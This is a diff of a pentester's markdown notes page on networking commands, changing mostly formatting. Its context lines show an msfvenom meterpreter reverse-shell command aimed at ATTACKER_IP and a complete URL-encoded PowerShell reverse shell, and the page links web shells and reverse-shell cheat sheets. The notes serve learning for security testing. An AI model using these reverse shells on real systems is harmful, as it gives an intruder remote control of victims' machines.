@@ -1,23 +1,23 @@
 # Networking Commands
 
-![](../../../.gitbook/assets/networking.png)
+![](.gitbook/assets/networking.png)
 
-***
+---
 
 ## 🌐 Resources 🔗
 
-> * [Nmap Cheat Sheet 2024: All the Commands & Flags - Stationx](https://www.stationx.net/nmap-cheat-sheet/)
-> * [Reverse Shell Cheat Sheet - pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
->   * [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
-> * [Reverse Shell Cheat Sheet - swisskyrepo](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
-> * [Reverse Shells - Linux | HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)
-> * [Online - Reverse Shell Generator](https://www.revshells.com/)
->   * [p0wny-shell](https://github.com/flozz/p0wny-shell)
->   * [R57 Shell](https://www.r57shell.net/index.php)
-> * [Upgrading Simple Shells to Fully Interactive TTYs - ropnop](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
-> * [TryHackMe | Intro to shells](https://tryhackme.com/r/room/introtoshells)
+> - [Nmap Cheat Sheet 2024: All the Commands & Flags - Stationx](https://www.stationx.net/nmap-cheat-sheet/)
+> - [Reverse Shell Cheat Sheet - pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+>   - [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
+> - [Reverse Shell Cheat Sheet - swisskyrepo](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
+> - [Reverse Shells - Linux | HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)
+> - [Online - Reverse Shell Generator](https://www.revshells.com/)
+>   - [p0wny-shell](https://github.com/flozz/p0wny-shell)
+>   - [R57 Shell](https://www.r57shell.net/index.php)
+> - [Upgrading Simple Shells to Fully Interactive TTYs - ropnop](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
+> - [TryHackMe | Intro to shells](https://tryhackme.com/r/room/introtoshells)
 
-***
+---
 
 ## nmap
 
@@ -65,7 +65,7 @@ nmap -Pn -sV -sC -O -oA outputfile TARGET_IP
 nmap -A -oA outputfile TARGET_IP
 ```
 
-***
+---
 
 ## tcpdump
 
@@ -121,7 +121,7 @@ tcpdump "tcp[tcpflags] & tcp-syn != 0"
 tcpdump "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0"
 ```
 
-***
+---
 
 ## ip
 
@@ -133,7 +133,7 @@ ip -br -c a
 dig +short myip.opendns.com @resolver1.opendns.com
 ```
 
-***
+---
 
 ## dns
 
@@ -141,7 +141,7 @@ dig +short myip.opendns.com @resolver1.opendns.com
 cat /etc/resolv.conf
 ```
 
-***
+---
 
 ## shells
 
@@ -234,10 +234,14 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_P
 
 **Python**
 
-1. Spawn a better featured bash shell; note that some targets may need the version of Python specified
-2. Get access to term commands (e.g. `clear`)
-3. Background the shell. Turn off our own terminal echo (which gives access to tab autocompletes, the arrow keys, and Ctrl + C) and foreground the shell
+1.  Spawn a better featured bash shell; note that some targets may need the version of Python specified
+
+2.  Get access to term commands (e.g. `clear`)
+
+3.  Background the shell. Turn off our own terminal echo (which gives access to tab autocompletes, the arrow keys, and Ctrl + C) and foreground the shell
+
 4. Change terminal tty size
+
 5. If the shell dies, any input in your own terminal will not be visible. To fix this, type `reset` and press enter
 
 ```bash
@@ -263,7 +267,7 @@ stty cols <number>
 reset
 ```
 
-***
+---
 
 ## web shells
 
@@ -299,7 +303,7 @@ docker run -it -p 8080:80 -d p0wny
 powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
 ```
 
-***
+---
 
 ## python webserver
 
@@ -307,4 +311,11 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
 sudo python3 -m http.server 8000
 ```
 
-***
+---
+
+
+
+
+
+
+
